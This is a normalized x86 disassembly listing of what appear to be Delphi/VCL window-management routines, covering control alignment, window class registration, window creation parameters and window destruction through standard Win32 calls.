mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_4513a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_451538
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_451567 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_4515f0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_451de4
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_418b9c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_418cf8
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_4511b0
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_451da8
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_418d74
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_418cf8
mov edx eax
mov ecx ebx
mov eax edi
call sub_451124
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_451760
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_451de4
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_451da8
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_451da8
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4517b4
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_451760
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_451893
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_4515f0
pop ecx
push ebp
mov al 0x2
call sub_4515f0
pop ecx
push ebp
mov al 0x3
call sub_4515f0
pop ecx
push ebp
mov al 0x4
call sub_4515f0
pop ecx
push ebp
mov al 0x5
call sub_4515f0
pop ecx
push ebp
mov al 0x6
call sub_4515f0
pop ecx
push ebp
xor eax eax
call sub_4515f0
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403518
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40331c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403518
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_4518b8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4553b8
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45194c
xor eax eax
push ebp
push sub_45193f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_451954
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_45197c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_451a41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44e2b8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_451de4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451a48
mov eax [ ebp - 0xc ]
call sub_40331c
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_451da8
mov edx eax
mov eax [ ebp - 0xc ]
call sub_418b9c
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_44e024
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418cf8
xor ecx ecx
mov edx 0xb03e
call sub_44fa80
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_451da8
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_451a50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_451de4
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_45194c
xor edx edx
push ebp
push sub_451b37
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_451de4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403518
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_451da8
mov edx eax
mov eax [ ebp - 0xc ]
call sub_418b9c
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_418cf8
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_40331c
mov eax [ ebp - 0x4 ]
call sub_451954
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_451da8
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_44ddc8
mov dl 0x4
call sub_44ddc8
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_418be8
sub_451ba4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4657c8
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_4694ec
sub_451bc4
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_44d1a8
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_44d1a8
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_44d1a8
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_451c10
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_44d1d0
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_44d1d0
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_44d1d0
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_451c58
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403518
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_44fa80
mov edx ebx
mov eax edi
call sub_451bc4
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_44fa80
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44fa80
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44fa80
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44fa80
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44fa80
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax edi
call sub_4553b8
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_44fa80
mov eax edi
call sub_4527a8
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4518b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_451d2c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_44fa80
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax esi
call sub_4553b8
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_451ba4
mov eax ebp
call sub_45260c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_451c10
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_44fa80
mov eax esi
call sub_451974
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44ecfc
sub_451da8
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_418cf8
mov edx edi
mov eax ebp
call sub_418cf8
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_451e04
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_451de4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_451da8
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_451e44
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_451e04
add esp 0x10
retn
sub_451e6c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_451ed8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_44ef10
test al al
je r-xdata
mov eax ebx
call sub_44ef40
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403518
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403518
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403518
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_451f40
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45205e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402d00
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_451ed8
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_4550b4
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_40326c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40437c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408c3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452065
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_451ffc
add [ eax ] al
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_40326c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40437c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408c3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452065
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_45206c
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45222d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_44b6a8
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_44b6a8
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40d2b8
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40d2b8
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408df0
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_4553c4
push 0x1
mov eax [ esi + 0x68 ]
call sub_424b14
mov ecx eax
mov edx 0x30
mov eax esi
call sub_44fa80
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_4550b4
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452234
lea eax [ ebp - 0xc0 ]
call sub_404118
retn
mov eax esi
mov si 0xffee
call sub_403518
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_45223c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406e94
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_45227c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d878
mov eax esi
call sub_41d7c8
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41d7c8
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41d880
pop esi
pop ebx
retn
sub_4522b4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41faac
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41f9e0
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41f9e0
mov eax esi
call sub_41fab4
add esp 0x10
pop esi
pop ebx
retn
sub_45231c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_452308
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_418cf8
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_418cf8
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_4523f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44fdb8
mov eax [ ebp - 0x8 ]
push eax
push sub_45227c
mov eax [ ebp - 0x8 ]
push eax
push sub_4522b4
push ebp
call sub_45231c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_452450
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44e828
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408da4
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408db8
mov ecx eax
mov edx edi
mov eax ebx
call sub_44e838
mov eax r-xdata
call sub_408dc4
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_44d2dc
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_4524a8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_4524f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4524fc
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40d2b8
sub_45250c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_418d54
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
